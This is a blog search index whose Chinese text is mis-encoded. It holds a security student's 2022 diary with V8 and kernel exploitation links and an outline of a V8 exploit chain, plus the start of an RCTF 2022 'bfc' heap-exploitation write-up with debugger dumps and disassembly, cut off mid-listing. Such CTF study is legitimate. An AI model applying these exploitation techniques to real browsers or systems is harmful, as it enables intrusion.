<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>æœ€è¿‘åœ¨æ‘¸ä»€ä¹ˆé±¼</title>
    <link href="/posts/f584cbf7.html"/>
    <url>/posts/f584cbf7.html</url>
    
    <content type="html"><![CDATA[<h2 id="æœ€è¿‘åœ¨æ‘¸ä»€ä¹ˆğŸŸ"><a class="header-anchor" href="#æœ€è¿‘åœ¨æ‘¸ä»€ä¹ˆğŸŸ">Â¶</a>æœ€è¿‘åœ¨æ‘¸ä»€ä¹ˆğŸŸ</h2><h3 id="2022-10-23"><a class="header-anchor" href="#2022-10-23">Â¶</a>2022.10.23</h3><h4 id="ä¸­ç§‘å¤§çš„-HackerGame-çœŸå¥½ç©-jpg"><a class="header-anchor" href="#ä¸­ç§‘å¤§çš„-HackerGame-çœŸå¥½ç©-jpg">Â¶</a>ä¸­ç§‘å¤§çš„ HackerGame çœŸå¥½ç©.jpg</h4><p>å¾ˆæ—©å‰å°±è€ƒè™‘å­¦ä¸€ç‚¹æ›´å¥‡æ€ªçš„ä¸œè¥¿äº†ï¼Œè¿˜ç©ä½ é‚£ç ´ glibc ğŸã€‚å°±ä»ç¬¬ä¸€å¤©ä¸‹åˆçœ‹åˆ°ç¬¬äºŒå¤©ä¸‹åˆï¼Œå®ç°äº† V8 ä» 0 åˆ° 0.1 ï¼ˆï¼Ÿï¼‰ã€‚æ‹¿äº†ä¸ª ğŸ©¸ï¼ˆæ¶¦</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/202210251120882.png" alt="image-20221025112028740"></p><p>è®°å½•ç‚¹å­¦ä¹ é“¾æ¥ï¼š</p><ul><li><a href="https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/">Exploiting v8: *CTF 2019 oob-v8</a>        <em>æ–°æ‰‹å…¥é—¨å¿…çœ‹ï¼Œå†™çš„å¤ªå¥½äº†</em></li><li><a href="https://jhalon.github.io/chrome-browser-exploitation-1/">Chrome Browser Exploitation, Part 1: Introduction to V8 and JavaScript Internals</a>         <em>ä»Šå¤©åˆšå‘çš„ç³»åˆ—æ–‡ï¼Œä¹Ÿå¾ˆè¯¦ç»†</em></li><li><a href="https://paper.seebug.org/1858/">ä» 0 å¼€å§‹å­¦ V8 æ¼æ´åˆ©ç”¨ä¹‹ CVE-2021-21225ï¼ˆä¹ï¼‰</a>        <em>ç³»åˆ—æ–‡ç« ï¼ŒCVE æ¯”è¾ƒæ–°ï¼Œé€‚åˆè·Ÿç€è°ƒè°ƒç»ƒç»ƒ</em></li><li><a href="https://github.com/Escapingbug/awesome-browser-exploit">awesome-browser-exploit</a>         <em>å¾ˆå…¨çš„è¡¨å• XDï¼Œæœ‰ç”Ÿä¹‹å¹´ç³»åˆ—ï¼ˆæŒ‡å­¦ä¹ ï¼‰</em></li></ul><p>å­¦ä¸€åœˆä¸‹æ¥è‡ªå·±çš„æ„Ÿå—ï¼š</p><p>V8 é‡Œé¢æ„Ÿè§‰ <code>è¶Šç•Œè¯»å†™/ä¸‹æ ‡è¶Šç•Œ</code> æ˜¯æœ€ç®€å•çš„æ¼æ´ç±»å‹ã€‚åªè¦èƒ½è½¬åŒ–ä¸ºè¿™ç±»çš„æ´ï¼ˆæ¯”å¦‚æŸç§æ–¹å¼æŠŠ length ğŸ‘ æˆ  -1 ï¼‰ï¼Œåœ¨å †å¸ƒå±€å¯æ§çš„æƒ…å†µä¸‹ï¼ŒåŸºæœ¬å°±èƒ½å‡º ovo</p><p>ç›®å‰æ¥è§¦åˆ°çš„åˆ©ç”¨æ–¹å¼æ„Ÿè§‰ä¹ŸæŒºå¥—è·¯åŒ–çš„ï¼Œå‚è€ƒ <a href="https://paper.seebug.org/1821/">V8 é€šç”¨åˆ©ç”¨é“¾</a>(å½“ç„¶é«˜ç‰ˆæœ¬éœ€è¦åˆ©ç”¨ JIT æˆ–è€…å…¶ä»–å¥‡æ€ªçš„æ–¹æ³•ï¼Œå‚è€ƒ <a href="https://tttang.com/archive/1443/">V8 æ²™ç®±ç»•è¿‡</a>) ï¼ŒåŸºæœ¬å°±æ˜¯è¶Šç•Œè¯»å†™æ‹¿ map æ”¹ mapï¼Œæ„é€  <code>addressOf</code> å’Œ <code>fakeObj</code> åŸè¯­ï¼Œè¿™ä¿©å‡ºæ¥ä¹‹åå°±å¯ä»¥å¾ˆç®€å•çš„æ„é€ ä»»æ„è¯»å†™ã€‚</p><p>æœ‰äº†ä»»æ„è¯»å†™ä¹‹åï¼Œè¦ä¹ˆåˆ›å»º <code>wasm</code>ï¼Œä» <code>wasmInstance</code> æ‹¿ rwx æƒé™åœ°å€å¡ <code>shellcode</code> ã€‚è¦ä¹ˆå †ä¸Šæœç´¢åœ°å€æ‹¿åˆ° <code>PIE</code> åŸºå€ï¼Œè¯» got è¡¨ leak libc è½¬åŒ–ä¸ºå¸¸è§çš„ç”¨æˆ·æ€æ”»å‡»æ‰‹æ³•ã€‚æ€»ä¹‹<strong>æ„Ÿè§‰ V8 çš„éš¾ç‚¹ä¸åœ¨åˆ©ç”¨ â•°ï¼ˆâ€µâ–¡â€²ï¼‰â•¯</strong></p><p>èƒ½å¤šå­¦ç‚¹è¿˜æ˜¯å¤šå­¦ç‚¹ ğŸ˜„</p><p>â˜€ï¸</p><h3 id="2022-10-18"><a class="header-anchor" href="#2022-10-18">Â¶</a>2022.10.18</h3><p>æ— æ„é—´åˆ·åˆ°äº†ä¸€äº›å¤§å¸ˆå‚…çš„åšå®¢ï¼Œå†æ¬¡æ„Ÿå—åˆ°äº† ctf çš„å±€é™æ€§ XDï¼Œå¯èƒ½ä¸‹ä¸€æ­¥å°±ä¸é‡ç‚¹å…³æ³¨ ctf äº†ï¼Œæ‰“æ‰“/å¤ç°é«˜è´¨é‡å›½é™…èµ›ï¼Œä¸é‡è¦çš„æ¯”èµ›ç®—äº† =ã€‚=</p><p>å¯ä»¥çš„è¯ï¼Œå»è¡¥ä¸€äº›åŸºç¡€å§ï¼Œç„¶åå¼€å§‹æçœŸæ­£çš„äºŒè¿›åˆ¶å®‰å…¨XDã€‚</p><p>â˜€ï¸</p><h3 id="2022-9-19"><a class="header-anchor" href="#2022-9-19">Â¶</a>2022.9.19</h3><h4 id="åŠ å…¥-Nu1L"><a class="header-anchor" href="#åŠ å…¥-Nu1L">Â¶</a>åŠ å…¥ <strong>Nu1L</strong></h4><p>å¾—åˆ°å¤§å¸ˆå‚…ä»¬çš„è®¤å¯æŒºå¼€å¿ƒçš„ï¼Œä¸‹ä¸€æ­¥æ˜¯å¤ç°å­¦ä¹ ä¸€äº›å¥‡å¥‡æ€ªæ€ªâ€¦</p><p>å”¯çƒ­çˆ±ä¸ä¿¡ä»»ä¸å¯è¾œè´Ÿã€‚</p><p>â˜€ï¸</p><h3 id="2022-9-12"><a class="header-anchor" href="#2022-9-12">Â¶</a>2022.9.12</h3><h4 id="å¼€å­¦ç ´é˜²å‘¨"><a class="header-anchor" href="#å¼€å­¦ç ´é˜²å‘¨">Â¶</a>å¼€å­¦ç ´é˜²å‘¨</h4><p>å¼€å­¦çš„å‰å‡ å‘¨æ€»æ˜¯ä¸€å †äº‹æƒ…ï¼Œç»ˆäºæœ‰æœºä¼šæ›´æ–°ä¸€ä¸‹åšå®¢ã€‚</p><p>æš‘å‡å…¶å®è¯´é—²ç€ä¹Ÿæ²¡æ€ä¹ˆé—²ç€ï¼Œæ‰“äº†ä¸€äº›æ¯”èµ›ï¼Œå›½èµ›å•Šï¼Œå¼ºç½‘æ¯ï¼ŒDSCTFï¼Œå…¶å®éƒ½æŒºä¸é”™çš„ï¼Œé¢˜ç›®éƒ½å¾ˆæœ‰æ„æ€ã€‚å°±æ˜¯è¿˜æ˜¯æ§åˆ¶ä¸ä½è‡ªå·±ï¼Œå­¦ä¹ æ•ˆç‡å…¶å®åªæœ‰æ™šä¸Šæ‰æœ‰ï¼Œä½†æƒ³åˆ°èº«ä½“é‡è¦ï¼Œä¹Ÿæ²¡ä¸€ç›´ç†¬å¤œäº†â€¦</p><p>è‡ªå·±ç›®å‰çš„å¿ƒè¿˜æ˜¯æ¯”è¾ƒæµ®èºï¼Œå¸Œæœ›è¿˜æ˜¯èƒ½é™ä¸‹å¿ƒæ¥ï¼Œä¸€äº›åˆå­¦æ—¶å€™çš„ç¬”è®°ç°åœ¨çœ‹æ¥å­˜åœ¨ç†è§£ä¸æ·±çğŸ”éœ¸å†™çš„æƒ…å†µã€‚æ–¹ä¾¿èµ·è§å…¨ä¸‹äº†ï¼Œä¹Ÿä¸‹å†³å¿ƒä¸‹æ¬¡å†å†™ä¸œè¥¿ï¼Œèµ„æ–™ä¸€å®šè¦æŸ¥å¥½ï¼ŒçŸ¥è¯†ç‚¹è½å®å¥½ï¼Œé“¾æ¥é™„å¥½ã€‚å¦‚æœæœ‰å¸ˆå‚…çœ‹æˆ‘çš„åšå®¢ï¼Œæˆ‘åè€Œè¿˜å‘äº†ä»–ä¸€æŠŠï¼Œé‚£è¿˜çœŸæ˜¯è«å¤§çš„ç½ªè¿‡=.=</p><p>ğŸŒ§ï¸</p><h3 id="2022-7-3"><a class="header-anchor" href="#2022-7-3">Â¶</a>2022.7.3</h3><h4 id="æ”¾æš‘å‡å•¦ï¼"><a class="header-anchor" href="#æ”¾æš‘å‡å•¦ï¼">Â¶</a>æ”¾æš‘å‡å•¦ï¼</h4><p>ç–«æƒ…å½±å“ï¼Œå†›è®­å’Œé«˜æ•°éƒ½æ¨è¿Ÿï¼Œæå‰æ”¾å‡äº†ã€‚æš‘å‡å¯ä»¥é™ä¸‹å¿ƒæ¥åšäº›äº‹æƒ…äº†ã€‚</p><p>æ ¡å†…çš„ç¤¾å›¢é‚£è¾¹ä¹Ÿè¦è€ƒè™‘ä¸€ä¸‹æ‹›äººå·¥ä½œäº†ï¼Œå¯èƒ½æœ‰ç‚¹å¤æ‚ä½†å¿…é¡»è¦å»åšã€‚</p><p>æ¯•ç«Ÿæ²¡æœ‰äººä¸€ç›´åœ¨æ‰“CTFï¼Œä½†CTFæ€»å¾—æœ‰äººåœ¨æ‰“ã€‚å¸Œæœ›æ°¸è¿œå¯„æ‰˜åœ¨åæµªã€‚ï¼ˆä¸ºä»€ä¹ˆè¯´çš„è¿™ä¹ˆæ­£ç»QwQ</p><p>â˜ï¸</p><h3 id="2022-6-15"><a class="header-anchor" href="#2022-6-15">Â¶</a>2022.6.15</h3><h4 id="èµç¾-Blog"><a class="header-anchor" href="#èµç¾-Blog">Â¶</a>èµç¾ Blog</h4><p>æœ‰ç‚¹å¿™ä¸è¿‡æ¥ã€‚å­¦æ ¡å®‰æ’çš„è¯¾ç¨‹éƒ½å¿«è¦ç»“è¯¾äº†ï¼Œæ€»å½’æ˜¯è¦åº”è€ƒï¼Œè€Œæˆ‘è‡ªå·±è¿™è¾¹çš„è¯è¯¾å†…è¿›åº¦è½ä¸‹çš„æ¯”è¾ƒå¤šï¼ˆğŸ‘´ çŸ¥é“é”™äº†ï¼‰ï¼Œèƒ½å­¦è‡ªå·±æƒ³å­¦çš„ä¸œè¥¿çš„æ—¶é—´å°±æ¯”è¾ƒå°‘ã€‚</p><p>ä»Šå¤©çœ‹äº†äº›å¤§ä½¬çš„æ¨æ–‡ï¼Œä¸€äº› CVE çš„ writeup åªèƒ½ç§°ä¹‹ä¸ºæƒŠè‰³ã€‚åšå®¢çœŸçš„æ˜¯ä¸ªå¾ˆä¼Ÿå¤§çš„ä¸œè¥¿ awaã€‚</p><p><strong>ä¸€ä¸ªå¾ˆå¥½ç”¨çš„æ­£åˆ™è¡¨è¾¾å¼å­¦ä¹ ç½‘ç«™</strong></p><p><a href="https://regex101.com/">regular expressions 101</a></p><p><strong>Kernel ROP ä» 0 åˆ° 1</strong></p><p><a href="https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/">Learning Linux Kernel Exploitation - Part 1</a></p><p><strong>ä¸€ä¸ªä¿å§†çº§ä» CVE å­¦ä¹  Kernel ROP çš„æ•™ç¨‹</strong></p><p><a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part1.html">CVE-2017-11176: A step-by-step Linux Kernel exploitation (part 1/4)</a></p><p><strong>Kernel å†™çš„æ¯”è¾ƒå¤šçš„åšä¸»</strong></p><p><a href="https://www.jianshu.com/u/a12c5b882be2">bsauce</a></p><p><a href="https://kagehutatsu.com/">å½±äºŒã¤</a></p><p><a href="https://arttnba3.cn/">arttnba3</a></p><p><a href="https://blog.csdn.net/Breeze_CAT">breezeO_o</a></p><p>èµç¾æ¯ä¸€ä¸ªæ„¿æ„å†™åšå®¢çš„å¸ˆå‚…ä»¬ï¼Œç»™äº†æˆ‘å¾ˆå¥½çš„å­¦ä¹ æœºä¼šã€‚</p><p>â˜€ï¸</p><h3 id="2022-6-12"><a class="header-anchor" href="#2022-6-12">Â¶</a>2022.6.12</h3><h4 id="å½“-glibc-éšé£è€Œå»"><a class="header-anchor" href="#å½“-glibc-éšé£è€Œå»">Â¶</a>å½“ glibc éšé£è€Œå»</h4><p>å‘ç°æœ€è¿‘çš„æ¯”èµ›é¢˜ç›®éƒ½åå‘äº <strong>å» glibc åŒ–</strong> ã€‚è¿™ä¸ªä¸æ˜¯å’±è¯´çš„å‡ºé¢˜ä¸ç»™ glibc æˆ–ç‰ˆæœ¬ï¼Œé‚£ç§å±äºå‡ºé¢˜äººè¦æŒ¨ğŸ”¨ã€‚è¿™é‡Œè¯´çš„æ˜¯å‡ºé¢˜æ ¹æœ¬æ²¡ç”¨åˆ° glibcã€‚</p><p>ä¾‹å¦‚å‰ä¸€æ®µæ—¶é—´æ¯”è¾ƒç«çš„ <strong>musl pwn</strong>ï¼Œå›½èµ›çš„ <strong>LLVM PASS PWN</strong>ï¼ŒDefcon Quals 2022 çš„ <strong>Luajit</strong> ã€‚è‡³äº V8ï¼ŒDockerï¼ŒQemu å’Œå…¶ä»–å¥‡å¥‡æ€ªæ€ªçš„é…·ç‚«ç©æ„ï¼Œä»¥åå†ç¢° ğŸ‘¦ã€‚</p><p><strong>musl çš„ä¸€äº›å­¦ä¹ èµ„æ–™</strong></p><p><a href="https://tttang.com/archive/1582/">Musl ç¨‹åºåˆ†æå’Œè°ƒè¯•ç¯å¢ƒé…ç½® &amp;&amp; éƒ¨åˆ†æºç åˆ†æ - 0xRGz</a></p><p><a href="https://www.anquanke.com/post/id/246929">musl-1.2.xå †éƒ¨åˆ†æºç åˆ†æ - ä¸€åªç‹—</a></p><p><strong>LLVM çš„ä¸€äº›å­¦ä¹ èµ„æ–™</strong></p><p><a href="https://x1ng.top/2021/05/16/ciscn-%E5%88%9D%E8%B5%9B-2021-wp/#satool">ciscn åˆèµ› 2021- SATOOL - X1ng</a></p><p><a href="https://xuanxuanblingbling.github.io/ctf/pwn/2019/12/21/llvm/">LLVM pass å®ç° C++è™šè¡¨ä¿æŠ¤ - Clangè£ç¼åº—</a></p><p><strong>LuaJIT</strong></p><p><a href="https://0xten.gitbook.io/public/defcon/2022/quals/smugglers-cove">Smugglerâ€™s Cove - 0xTen</a></p><p>â˜ï¸</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>RCTF 2022 Pwn bfc&amp;picStore</title>
    <link href="/posts/3573e2f.html"/>
    <url>/posts/3573e2f.html</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a class="header-anchor" href="#å‰è¨€">Â¶</a>å‰è¨€</h2><p>å‘¨æœ«å’Œ Nu1L çš„å¸ˆå‚…ä»¬æ‰“äº† RCTFï¼Œæ‰“å®Œå°±ä¸€ä¸ªæ„Ÿå—ï¼šæˆ‘æ€ä¹ˆè¿™ä¹ˆèœ qwqï¼Œé˜Ÿå‹æ€ä¹ˆè¿™ä¹ˆå¼º orzã€‚</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/202212121930382.png" alt="image-20221212193042001"></p><p>å¤œé‡Œ AAA å’Œ Organizers çš„å¸ˆå‚…ä»¬å¼€å§‹ä¸Šå·äº†ï¼Œå¾—ç»§ç»­è‚ä¸€è‚ã€‚äºæ˜¯ä¹å½“æ™šæˆ‘è¢« Mr.R å¸ˆå‚…å¸¦ç€æ‹¿äº†ä¿©ä¸ªäºŒè¡€ (<code>picStore</code>,<code>bfc</code>)ï¼Œä¸­é—´æˆ‘çš„åˆ†æé”™è¯¯æµªè´¹äº† Mr.R å¸ˆå‚…å¥½å¤šæ—¶é—´orz(æœ€å <code>bfc</code> é‡å†™äº†)â€¦æœ€åè¿˜æ˜¯æ²¡èƒ½å·è¿‡ Organizers =ã€‚=</p><hr><h2 id="bfc"><a class="header-anchor" href="#bfc">Â¶</a>bfc</h2><p>è¿™é¢˜å…¶å®å¹¶ä¸éš¾ï¼Œä»€ä¹ˆï¼Œä½ ä¸ä¼šé€†ï¼Ÿæˆ³å•¦ğŸ‘¦ğŸ»ï¼ä¸Šå½“å•¦ã€‚</p><p>å…¶å®ç›´æ¥çœ‹ <a href="https://zh.m.wikipedia.org/zh-hans/Brainfuck">wiki</a> å°±èƒ½çŸ¥é“ç¬¦å·ä»£è¡¨çš„æ„æ€ï¼š</p><p>ä¸‹é¢æ˜¯è¿™å…«ç§çŠ¶æ€çš„æè¿°ï¼Œå…¶ä¸­æ¯ä¸ªçŠ¶æ€ç”±ä¸€ä¸ª<a href="https://zh.m.wikipedia.org/wiki/%E5%AD%97%E7%AC%A6">å­—ç¬¦</a>æ ‡è¯†ï¼š</p><table><thead><tr><th style="text-align:center">å­—ç¬¦</th><th style="text-align:center">å«ä¹‰</th></tr></thead><tbody><tr><td style="text-align:center"><code>&gt;</code></td><td style="text-align:center">æŒ‡é’ˆåŠ ä¸€</td></tr><tr><td style="text-align:center"><code>&lt;</code></td><td style="text-align:center">æŒ‡é’ˆå‡ä¸€</td></tr><tr><td style="text-align:center"><code>+</code></td><td style="text-align:center">æŒ‡é’ˆæ‰€æŒ‡å­—èŠ‚çš„å€¼åŠ ä¸€</td></tr><tr><td style="text-align:center"><code>-</code></td><td style="text-align:center">æŒ‡é’ˆæ‰€æŒ‡å­—èŠ‚çš„å€¼å‡ä¸€</td></tr><tr><td style="text-align:center"><code>.</code></td><td style="text-align:center">è¾“å‡ºæŒ‡é’ˆæ‰€æŒ‡å­—èŠ‚å†…å®¹ï¼ˆ<a href="https://zh.m.wikipedia.org/wiki/ASCII%E7%A0%81">ASCIIç </a>ï¼‰</td></tr><tr><td style="text-align:center"><code>,</code></td><td style="text-align:center">å‘æŒ‡é’ˆæ‰€æŒ‡çš„å­—èŠ‚è¾“å…¥å†…å®¹ï¼ˆASCIIç ï¼‰</td></tr><tr><td style="text-align:center"><code>[</code></td><td style="text-align:center">è‹¥æŒ‡é’ˆæ‰€æŒ‡å­—èŠ‚çš„å€¼ä¸ºé›¶ï¼Œåˆ™å‘åè·³è½¬ï¼Œè·³è½¬åˆ°å…¶å¯¹åº”çš„<code>]</code>çš„ä¸‹ä¸€ä¸ªæŒ‡ä»¤å¤„</td></tr><tr><td style="text-align:center"><code>]</code></td><td style="text-align:center">è‹¥æŒ‡é’ˆæ‰€æŒ‡å­—èŠ‚çš„å€¼ä¸ä¸ºé›¶ï¼Œåˆ™å‘å‰è·³è½¬ï¼Œè·³è½¬åˆ°å…¶å¯¹åº”çš„<code>[</code>çš„ä¸‹ä¸€ä¸ªæŒ‡ä»¤å¤„</td></tr></tbody></table><p>å€¼å¾—æ³¨æ„çš„æ˜¯é¢˜ç›®è‡ªå·±é­”æ”¹äº†ä¸€ä¸ª <code>?</code> æ¥ <code>malloc(0x1)</code>ã€‚</p><p>BrainfuckæŒ‡ä»¤å¯ä»¥é€ä¸€æ›¿æ¢ï¼Œç¿»è¯‘æˆ<a href="https://zh.m.wikipedia.org/wiki/C%E8%AF%AD%E8%A8%80">Cè¯­è¨€</a>ï¼ˆå‡è®¾<code>ptr</code>æ˜¯<code>char *</code><a href="https://zh.m.wikipedia.org/wiki/%E8%B3%87%E6%96%99%E9%A1%9E%E5%9E%8B">ç±»å‹</a>ï¼‰çš„è¯­å¥ä¹‹ç±»ï¼š</p><table><thead><tr><th style="text-align:center">Brainfuck</th><th style="text-align:center">C</th></tr></thead><tbody><tr><td style="text-align:center"><code>&gt;</code></td><td style="text-align:center"><code>++ptr;</code></td></tr><tr><td style="text-align:center"><code>&lt;</code></td><td style="text-align:center"><code>--ptr;</code></td></tr><tr><td style="text-align:center"><code>+</code></td><td style="text-align:center"><code>++*ptr;</code></td></tr><tr><td style="text-align:center"><code>-</code></td><td style="text-align:center"><code>--*ptr;</code></td></tr><tr><td style="text-align:center"><code>.</code></td><td style="text-align:center"><code>putchar(*ptr);</code></td></tr><tr><td style="text-align:center"><code>,</code></td><td style="text-align:center"><code>*ptr = getchar();</code></td></tr><tr><td style="text-align:center"><code>[</code></td><td style="text-align:center"><code>while (*ptr) &#123;</code></td></tr><tr><td style="text-align:center"><code>]</code></td><td style="text-align:center"><code>&#125;</code></td></tr></tbody></table><p>å‚è€ƒ Wiki ç»™çš„ç¤ºä¾‹æˆ‘ä»¬å¯ä»¥æ„é€ å‡ºä¸€äº›æ¯”è¾ƒæœ‰æ„æ€çš„æŒ‡ä»¤ï¼š</p><ul><li><p>å·¦ç§»åˆ° <code>*ptr == '\x00'</code>:</p><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck">&lt;<span class="hljs-title">[</span>&lt;<span class="hljs-title">]</span><br></code></pre></td></tr></table></figure><p><code>&lt;</code> å°±æ˜¯å·¦ç§»ï¼Œ<code>[]</code> å¯ä»¥çœ‹åˆ°æ˜¯ <code>*ptr != 0</code>  çš„æ—¶å€™è¿›è¡Œå¾ªç¯ï¼Œéå¸¸å¥½ç†è§£</p></li><li><p>ä¸€ç›´è¯»å–è¾“å…¥åˆ° <code>*ptr = '\n'</code>ï¼š</p><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-string">,</span><span class="hljs-literal">----------</span><span class="hljs-title">[</span><span class="hljs-literal">++++++++++</span>&lt;<span class="hljs-string">,</span><span class="hljs-literal">----------</span><span class="hljs-title">]</span><br></code></pre></td></tr></table></figure><p><code>,</code> æ˜¯å…ˆ <code>read(0,ptr,1)</code> ï¼Œ<code>-</code> é‡å¤åæ¬¡æ˜¯å‡å»äº† <code>\n</code>(0xa)ï¼Œç„¶åå¦‚æœæ­¤æ—¶ <code>*ptr == 0</code>ï¼Œè¿›å…¥å¾ªç¯ï¼Œ<code>+</code> é‡å¤åæ¬¡æ˜¯æ¢å¤ <code>*ptr</code> ä¸ºåŸæ¥çš„å­—èŠ‚ã€‚éšåå·¦ç§»ï¼Œå¼€å§‹æ–°ä¸€è½®çš„å¾ªç¯ã€‚ä¸€ç›´åˆ° <code>*ptr = '\n'</code> ä¸ºæ­¢ã€‚</p><p>è¿™ä¸ªå°±å¾ˆæœ‰æ„æ€äº†ï¼Œå¯ä»¥åœ¨å¾ˆå°çš„ç©ºé—´æ¶ˆè€—å†…æŠŠå †æ‘åœ°ä¸Šæ‘©æ“¦ã€‚</p></li></ul><p>é‚£ä¹ˆå…¶å®å°±å¾ˆç®€å•äº†ï¼Œç›¸å½“äºæˆ‘ä»¬æ˜¯å¯ä»¥åœ¨å †ä¸Šè¿›è¡Œä»»æ„æ“ä½œäº†ã€‚ä½†æ˜¯å¦‚æœä½ å’Œæˆ‘ä¸€æ ·ç°åœ¨å°±å»è½äº†ï¼Œå¯èƒ½ Leak å…¨äº†æœ€åè¿˜æ˜¯æ²¡æœ‰å¥½æœæ±åƒã€‚è¿˜è¦è®¤çœŸçœ‹ä¸€ä¸‹ç¨‹åºçš„å‡½æ•°ä»£ç å’Œæµç¨‹å®ç°ï¼š</p><p>åœ¨ <code>init(sub_2619)</code> å‡½æ•°æ—¶ memcpy è¿‡æ¥ä¸€å †å­—èŠ‚ç ä¹Ÿå°±æ˜¯ä¸€äº›æ¨¡æ‹Ÿ bf çš„å‡½æ•°ï¼š</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/202212132314093.png" alt="image-20221213010852499"></p><p>è°ƒè¯•çœ‹åˆ°ï¼š</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-built_in">RDI</span>  <span class="hljs-number">0x55555555c2e0</span> â€”â–¸ <span class="hljs-number">0x55555555c2f0</span> â—‚â€” <span class="hljs-number">0x478348ffffffa8e8</span><br></code></pre></td></tr></table></figure><p>å…¶ä¸­çš„ <code>0x478348ffffffa8e8</code> å°±æ˜¯å­—èŠ‚ç ã€‚åé¢ç”¨æˆ·è¾“å…¥å…¶å®æ˜¯ä¸€å †è·³è½¬æŒ‡ä»¤ï¼Œæ¥è°ƒç”¨æ¨¡æ‹Ÿå‡½æ•°ã€‚</p><p>æˆ‘ä»¬ç¨å¾®åˆ†æä¸€ä¸‹å‡½æ•°å®ç°ï¼Œæœ€åå®é™…ä¸Šçš„ç”»é£ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">((<span class="hljs-type">void</span> (__fastcall *)(__int64 *))(addr + <span class="hljs-number">0xE5</span>))(&amp;qword_8460);<br></code></pre></td></tr></table></figure><p><code>&amp;qword_8460</code> å­˜æ”¾çš„æ•°æ®å¦‚ä¸‹ï¼š</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">0</span>x55<span class="hljs-number">69f6327460</span>: <span class="hljs-number">0</span>x00005569f<span class="hljs-number">771c620</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000010</span>&lt;-- ptr   |  now_size<br><span class="hljs-number">0</span>x55<span class="hljs-number">69f6327470</span>: <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00007f<span class="hljs-number">4a157e1000</span>&lt;-- offset|  rwx_page(code)<br><span class="hljs-number">0</span>x55<span class="hljs-number">69f6327480</span>: <span class="hljs-number">0</span>x00007f<span class="hljs-number">4a1540c120</span>      <span class="hljs-number">0</span>x00007f4a<span class="hljs-number">1540c460</span>&lt;-- malloc|  free<br><span class="hljs-number">0</span>x55<span class="hljs-number">69f6327490</span>: <span class="hljs-number">0</span>x00007f<span class="hljs-number">4a15507940</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000002</span>&lt;-- memcpy|  malloc_chance<br><span class="hljs-number">0</span>x55<span class="hljs-number">69f63274a0</span>: <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000002</span><br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><code class="hljs asm">æ£€æµ‹å½“å‰ offset:<br>   0x7f5434ba2000:      mov    rax,QWORD PTR [rdi+0x8]<br>   0x7f5434ba2004:      mov    rbx,QWORD PTR [rdi+0x10]<br>   0x7f5434ba2008:      inc    rbx<br>   0x7f5434ba200b:      cmp    rax,rbx<br>   0x7f5434ba200e:      jg     